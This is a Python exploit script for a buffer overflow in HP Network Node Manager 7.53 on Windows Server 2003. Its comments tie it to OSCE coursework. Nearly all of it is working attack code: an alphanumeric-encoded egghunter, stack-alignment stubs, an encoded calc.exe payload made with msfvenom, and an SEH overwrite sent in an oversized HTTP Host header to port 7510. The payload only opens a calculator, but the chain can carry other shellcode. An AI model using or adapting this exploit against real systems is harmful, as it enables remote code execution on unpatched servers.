#!/usr/bin/python
# HP NNM 7.53 exploit, slighly differnet to the one covered in the OSCE course work 
# Server 2003 SP1 
import socket 
import os
import sys

host = "192.168.1.107"
port = 7510

encodedegghunter = ""
encodedegghunter += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x5d\x55\x5d\x2d"
encodedegghunter += "\x2d\x5d\x55\x5d\x2d\x31\x5e\x55\x5d\x50\x25\x4a\x4d\x4e\x55\x25"
encodedegghunter += "\x35\x32\x31\x2a\x2d\x70\x2c\x5c\x6f\x2d\x70\x2c\x5c\x6f\x2d\x71"
encodedegghunter += "\x31\x5d\x71\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d"
encodedegghunter += "\x2c\x27\x62\x2d\x2d\x2c\x27\x62\x2d\x2e\x2d\x28\x64\x50\x25\x4a"
encodedegghunter += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5b\x6c\x2c\x2d\x2d\x5b\x6c"
encodedegghunter += "\x2c\x2d\x2d\x5b\x6e\x2c\x2d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
encodedegghunter += "\x31\x2a\x2d\x41\x53\x37\x2d\x2d\x41\x53\x37\x2d\x2d\x42\x54\x37"
encodedegghunter += "\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x37\x66"
encodedegghunter += "\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46\x50\x25\x4a\x4d\x4e"
encodedegghunter += "\x55\x25\x35\x32\x31\x2a\x2d\x50\x3e\x39\x31\x2d\x50\x3e\x39\x31"
encodedegghunter += "\x2d\x51\x41\x3b\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
encodedegghunter += "\x2d\x33\x2a\x67\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50"

# Stack alignment for decoding the egghunter in memory 
stackalignment =""
stackalignment += "\x25\x4A\x4D\x4E\x55" # AND EAX ( To zero it XOR command a badchar)
stackalignment += "\x25\x35\x32\x31\x2A" # AND EAX
stackalignment += "\x54" # PUSH ESP 
stackalignment += "\x58" # POP EAX (Current stack pointer now stored in EAX) 
stackalignment += "\x2D\x10\x44\x77\x77" # WE want to add 0x16ca to EAX to adjust the stack but have to split it 
stackalignment += "\x2D\x10\x41\x77\x77" # Across three sub commands to get the same thing 
stackalignment += "\x2D\x16\x64\x11\x11"
stackalignment += "\x50" # PUSH EAX to the stack as it contains where we want to place our code 
stackalignment += "\x5C" # POP ESP

# Stack alignment for decoding the payload in memory 
#  Add 2800 bytes (0x960) to ESP 
stackalignment_payload =""
stackalignment_payload += "\x25\x4A\x4D\x4E\x55" # AND EAX ( To zero it XOR command a badchar)
stackalignment_payload += "\x25\x35\x32\x31\x2A" # AND EAX
stackalignment_payload += "\x57" # PUSH EDI (Current location found by Egghunter) 
stackalignment_payload += "\x58" # POP EAX (Current location stored in EAX) 
stackalignment_payload += "\x2d\x02\x77\x77\x77" # WE want to add AF0x to EAX to adjust the stack but have to split it 
stackalignment_payload += "\x2d\x08\x28\x77\x77" # Across three sub commands to get the same thing 
stackalignment_payload += "\x2d\x06\x56\x11\x11"
stackalignment_payload += "\x50" # PUSH EAX to the stack as it contains where we want to place our code 
stackalignment_payload += "\x5C" # POP ESP

#ESP align by 4 hex bytes = 83EC10545831D2BB04000000F7F329D4, plus
# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=seh -a x86 -f hex
# Both run through AlphaNum encoder 
encodedpayload = ""
encodedpayload += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x25\x25\x25\x2d\x55"
encodedpayload += "\x25\x25\x25\x2d\x56\x25\x25\x25\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
encodedpayload += "\x31\x2a\x2d\x46\x33\x2d\x33\x2d\x46\x33\x2d\x33\x2d\x46\x34\x2d\x34"
encodedpayload += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x34\x34\x31\x34\x2d"
encodedpayload += "\x34\x34\x31\x34\x2d\x35\x36\x31\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35"
encodedpayload += "\x32\x31\x2a\x2d\x55\x38\x55\x63\x2d\x55\x38\x55\x63\x2d\x56\x3c\x56"
encodedpayload += "\x63\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x2e\x30\x31"
encodedpayload += "\x2d\x4f\x2e\x30\x31\x2d\x4f\x31\x30\x33\x50\x25\x4a\x4d\x4e\x55\x25"
encodedpayload += "\x35\x32\x31\x2a\x2d\x2d\x53\x6c\x3d\x2d\x2d\x53\x6c\x3d\x2d\x31\x54"
encodedpayload += "\x6c\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x52\x2a\x56"
encodedpayload += "\x5f\x2d\x52\x2a\x56\x5f\x2d\x52\x2b\x58\x60\x50\x25\x4a\x4d\x4e\x55"
encodedpayload += "\x25\x35\x32\x31\x2a\x2d\x63\x3e\x53\x2b\x2d\x63\x3e\x53\x2b\x2d\x65"
encodedpayload += "\x46\x53\x2d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x23\x6b"
encodedpayload += "\x20\x55\x2d\x23\x6b\x20\x55\x2d\x25\x6c\x21\x56\x50\x25\x4a\x4d\x4e"
encodedpayload += "\x55\x25\x35\x32\x31\x2a\x2d\x44\x5c\x32\x73\x2d\x44\x5c\x32\x73\x2d"
encodedpayload += "\x46\x5d\x32\x73\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63"
encodedpayload += "\x6b\x55\x50\x2d\x63\x6b\x55\x50\x2d\x65\x6d\x56\x50\x50\x25\x4a\x4d"
encodedpayload += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x30\x28\x55\x2d\x27\x30\x28\x55"
encodedpayload += "\x2d\x27\x30\x28\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
encodedpayload += "\x55\x39\x32\x44\x2d\x55\x39\x32\x44\x2d\x56\x3d\x33\x46\x50\x25\x4a"
encodedpayload += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x29\x6f\x54\x55\x2d\x29\x6f\x54"
encodedpayload += "\x55\x2d\x29\x6f\x56\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
encodedpayload += "\x2d\x36\x31\x54\x26\x2d\x36\x31\x54\x26\x2d\x37\x33\x56\x26\x50\x25"
encodedpayload += "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x4f\x5c\x25\x2d\x27\x4f"
encodedpayload += "\x5c\x25\x2d\x27\x4f\x5c\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
encodedpayload += "\x2a\x2d\x60\x35\x35\x37\x2d\x60\x35\x35\x37\x2d\x60\x35\x36\x37\x50"
encodedpayload += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x37\x39\x55\x2d\x37"
encodedpayload += "\x37\x39\x55\x2d\x39\x37\x3c\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
encodedpayload += "\x31\x2a\x2d\x49\x36\x36\x34\x2d\x49\x36\x36\x34\x2d\x4a\x38\x38\x36"
encodedpayload += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x27\x3d\x49\x2d"
encodedpayload += "\x65\x27\x3d\x49\x2d\x66\x27\x41\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35"
encodedpayload += "\x32\x31\x2a\x2d\x27\x53\x26\x54\x2d\x27\x53\x26\x54\x2d\x27\x55\x28"
encodedpayload += "\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x4b\x54\x64"
encodedpayload += "\x2d\x38\x4b\x54\x64\x2d\x38\x4d\x56\x64\x50\x25\x4a\x4d\x4e\x55\x25"
encodedpayload += "\x35\x32\x31\x2a\x2d\x27\x51\x3c\x26\x2d\x27\x51\x3c\x26\x2d\x27\x51"
encodedpayload += "\x3c\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x49\x54\x64"
encodedpayload += "\x32\x2d\x49\x54\x64\x32\x2d\x4a\x56\x64\x34\x50\x25\x4a\x4d\x4e\x55"
encodedpayload += "\x25\x35\x32\x31\x2a\x2d\x5e\x37\x26\x37\x2d\x5e\x37\x26\x37\x2d\x60"
encodedpayload += "\x38\x28\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x2b"
encodedpayload += "\x49\x2e\x2d\x41\x2b\x49\x2e\x2d\x43\x2c\x49\x2e\x50\x25\x4a\x4d\x4e"
encodedpayload += "\x55\x25\x35\x32\x31\x2a\x2d\x58\x53\x2b\x57\x2d\x58\x53\x2b\x57\x2d"
encodedpayload += "\x5a\x55\x2c\x59\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x68"
encodedpayload += "\x42\x5f\x2c\x2d\x68\x42\x5f\x2c\x2d\x69\x42\x61\x31\x50\x25\x4a\x4d"
encodedpayload += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6a\x65\x50\x54\x2d\x6a\x65\x50\x54"
encodedpayload += "\x2d\x6b\x65\x51\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
encodedpayload += "\x63\x44\x55\x70\x2d\x63\x44\x55\x70\x2d\x64\x45\x56\x72\x50\x25\x4a"
encodedpayload += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x43\x26\x54\x2d\x27\x43\x26"
encodedpayload += "\x54\x2d\x27\x45\x28\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
encodedpayload += "\x2d\x4d\x5e\x41\x3c\x2d\x4d\x5e\x41\x3c\x2d\x4e\x60\x42\x3e\x50\x25"
encodedpayload += "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x64\x26\x3c\x2d\x55\x64"
encodedpayload += "\x26\x3c\x2d\x55\x64\x27\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
encodedpayload += "\x2a\x2d\x39\x26\x37\x4a\x2d\x39\x26\x37\x4a\x2d\x3d\x28\x38\x4b\x50"
encodedpayload += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x3c\x54\x64\x2d\x5f"
encodedpayload += "\x3c\x54\x64\x2d\x5f\x3e\x56\x66\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
encodedpayload += "\x31\x2a\x2d\x27\x3b\x4f\x2d\x2d\x27\x3b\x4f\x2d\x2d\x27\x3d\x50\x2d"
encodedpayload += "\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x26\x3c\x41\x2d"
encodedpayload += "\x50\x26\x3c\x41\x2d\x50\x28\x3d\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35"
encodedpayload += "\x32\x31\x2a\x2d\x39\x38\x26\x39\x2d\x39\x38\x26\x39\x2d\x3c\x38\x28"
encodedpayload += "\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x68\x5e\x59"
encodedpayload += "\x2d\x55\x68\x5e\x59\x2d\x55\x68\x60\x5a\x50\x25\x4a\x4d\x4e\x55\x25"
encodedpayload += "\x35\x32\x31\x2a\x2d\x4a\x6a\x65\x50\x2d\x4a\x6a\x65\x50\x2d\x4c\x6a"
encodedpayload += "\x65\x51\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x35\x2b\x54"
encodedpayload += "\x46\x2d\x35\x2b\x54\x46\x2d\x35\x2d\x55\x47\x50\x25\x4a\x4d\x4e\x55"
encodedpayload += "\x25\x35\x32\x31\x2a\x2d\x45\x55\x70\x3e\x2d\x45\x55\x70\x3e\x2d\x45"
encodedpayload += "\x56\x72\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x6d"
encodedpayload += "\x3c\x48\x2d\x50\x6d\x3c\x48\x2d\x51\x6e\x3c\x49\x50\x25\x4a\x4d\x4e"
encodedpayload += "\x55\x25\x35\x32\x31\x2a\x2d\x4e\x26\x2e\x47\x2d\x4e\x26\x2e\x47\x2d"
encodedpayload += "\x50\x28\x31\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39"
encodedpayload += "\x51\x26\x39\x2d\x39\x51\x26\x39\x2d\x3c\x51\x28\x3b\x50\x25\x4a\x4d"
encodedpayload += "\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x39\x45\x26\x2d\x27\x39\x45\x26"
encodedpayload += "\x2d\x27\x3d\x45\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d"
encodedpayload += "\x5e\x44\x6a\x33\x2d\x5e\x44\x6a\x33\x2d\x5f\x45\x6b\x34\x50\x25\x4a"
encodedpayload += "\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x35\x27\x2d\x55\x55\x35"
encodedpayload += "\x27\x2d\x56\x55\x35\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
encodedpayload += "\x2d\x56\x5c\x29\x55\x2d\x56\x5c\x29\x55\x2d\x58\x5e\x2a\x55\x50\x25"
encodedpayload += "\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x58\x59\x47\x63\x2d\x58\x59"
encodedpayload += "\x47\x63\x2d\x59\x59\x47\x65\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31"
encodedpayload += "\x2a\x2d\x54\x55\x55\x55\x2d\x54\x55\x55\x55\x2d\x54\x55\x55\x55\x50"
encodedpayload += "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x44\x64\x6b\x2d\x38"
encodedpayload += "\x44\x64\x6b\x2d\x38\x46\x65\x6d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32"
encodedpayload += "\x31\x2a\x2d\x29\x5b\x4f\x39\x2d\x29\x5b\x4f\x39\x2d\x2b\x5d\x50\x39"
encodedpayload += "\x50"

payload =  "zxxzzxxz" # egg
payload += stackalignment_payload # Align stack so our payload decodes in a location we will hit in code 
payload += encodedpayload # Calc.exe payload

crash = ""
crash += payload  
crash += "A" * (3305 -len(payload) )  # Doesn't work with 3920+
crash += "\x4b\x4b\x78\x04" # JMP
crash += "\x68\x3c\x64\x6d" # 0x6d643c68 : pop eax # pop esi # ret 
crash += stackalignment
crash += encodedegghunter
crash += "\x41" * (3919 - 3305 - 4 -4 - len(encodedegghunter) - len(stackalignment)) # NB: Needs to be an opcode that pass over in code

buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580"
buffer += "\r\n\r\n" # Closes http request 
print "[*] Sending Evil HTTP Request to NNMz, lolz"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((host, port))
expl.send(buffer)
expl.close()

